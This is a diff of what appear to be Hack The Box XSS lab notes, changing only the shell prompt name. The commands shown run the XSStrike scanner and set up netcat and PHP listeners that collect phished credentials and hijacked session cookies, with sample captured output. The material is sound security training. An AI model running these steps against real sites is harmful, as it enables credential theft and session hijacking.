@@ -262,10 +262,10 @@ Some of the common open-source tools that can assist us in XSS discovery are [XS
 &#x20; XSS Discovery
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
-AbdulrahmanTamim@htb[/htb]$ cd XSStrike
-AbdulrahmanTamim@htb[/htb]$ pip install -r requirements.txt
-AbdulrahmanTamim@htb[/htb]$ python xsstrike.py
+root@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
+root@htb[/htb]$ cd XSStrike
+root@htb[/htb]$ pip install -r requirements.txt
+root@htb[/htb]$ python xsstrike.py
 
 XSStrike v3.1.4
 ...SNIP...
@@ -276,7 +276,7 @@ We can then run the script and provide it a URL with a parameter using `-u`. Let
 &#x20; XSS Discovery
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
+root@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
 
         XSStrike v3.1.4
 
@@ -606,7 +606,7 @@ So, let us start a simple `netcat` server and see what kind of request we get wh
 &#x20; Phishing
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo nc -lvnp 80
+root@htb[/htb]$ sudo nc -lvnp 80
 listening on [any] 80 ...
 ```
 
@@ -646,10 +646,10 @@ Now that we have our `index.php` file ready, we can start a `PHP` listening serv
 &#x20; Phishing
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ mkdir /tmp/tmpserver
-AbdulrahmanTamim@htb[/htb]$ cd /tmp/tmpserver
-AbdulrahmanTamim@htb[/htb]$ vi index.php #at this step we wrote our index.php file
-AbdulrahmanTamim@htb[/htb]$ sudo php -S 0.0.0.0:80
+root@htb[/htb]$ mkdir /tmp/tmpserver
+root@htb[/htb]$ cd /tmp/tmpserver
+root@htb[/htb]$ vi index.php #at this step we wrote our index.php file
+root@htb[/htb]$ sudo php -S 0.0.0.0:80
 PHP 7.4.15 Development Server (http://0.0.0.0:80) started
 ```
 
@@ -662,7 +662,7 @@ If we check the `creds.txt` file in our Pwnbox, we see that we did get the login
 &#x20; Phishing
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat creds.txt
+root@htb[/htb]$ cat creds.txt
 Username: test | Password: test
 ```
 
@@ -749,9 +749,9 @@ Before we start sending payloads, we need to start a listener on our VM, using `
 &#x20; Session Hijacking
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ mkdir /tmp/tmpserver
-AbdulrahmanTamim@htb[/htb]$ cd /tmp/tmpserver
-AbdulrahmanTamim@htb[/htb]$ sudo php -S 0.0.0.0:80
+root@htb[/htb]$ mkdir /tmp/tmpserver
+root@htb[/htb]$ cd /tmp/tmpserver
+root@htb[/htb]$ sudo php -S 0.0.0.0:80
 PHP 7.4.15 Development Server (http://0.0.0.0:80) started
 ```
 
@@ -840,7 +840,7 @@ As mentioned earlier, we get the cookie value right in the terminal, as we can s
 &#x20; Session Hijacking
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat cookies.txt 
+root@htb[/htb]$ cat cookies.txt 
 Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
 ```
 
